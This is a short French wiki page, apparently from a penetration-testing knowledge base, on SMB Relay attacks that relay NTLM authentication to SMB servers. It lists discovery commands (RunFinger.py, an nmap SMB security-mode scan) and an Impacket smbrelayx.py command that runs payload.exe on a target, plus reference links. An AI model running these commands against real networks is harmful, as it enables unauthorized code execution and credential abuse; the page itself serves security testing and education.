---
title: SMB Relay
permalink: /SMB_Relay/
---

# SMB Relay

SMB Relay est une méthode d'attaque permettant de relayer une authentification NTLM pour s'authentifier auprès d'un service [SMB](/SMB "wikilink").

## Méthodologie

Pour pouvoir faire un SMB relay il faut avoir une requête à relayer. De nombreuses méthodes sont décrites sur [Places of Interest in Stealing NetNTLM Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/). La méthode la plus classique reste Responder.

## Outils

### Découverte

Il est possible d'identifier les serveurs vulnérables avec un des scripts suivants:

``` bash
/usr/share/responder/tools/RunFinger.py -i $target
nmap --script smb-security-mode.nse -Pn -p445 X.X.X.X/24 -oA nmap_smb_security_mode_full
```


### Exploitation

[Impacket](/Impacket "wikilink") propose un outil **smbrelayx.py**:

Une utilisation simple est la suivante:

``` bash
smbrelayx.py -e payload.exe -h 10.33.1.1
```

Ceci executera le fichier payload.exe sur le serveur 10.33.1.1 si l'utilisateur qu'on relaie a les droits nécessaires.

[Responder](/Responder "wikilink") contient également différents outils.

## Références

### Liens externes

-   [SMBRelay avec python sur SANS](https://pen-testing.sans.org/blog/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python)
-   [SMB Relay sur carnal0wnage](http://carnal0wnage.attackresearch.com/2012/11/windows-7-and-smb-relay.html)
-   [Méthodes de défense sur skullsecurity](https://blog.skullsecurity.org/2008/ms08-068-preventing-smbrelay-attacks)
-   [MS08_068 + MS10_046 = FUN UNTIL 2018](http://room362.com/post/2012/2012-02-11-ms08_068-ms10_046-fun-until-2018/)
-   [Places of Interest in Stealing NetNTLM Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)


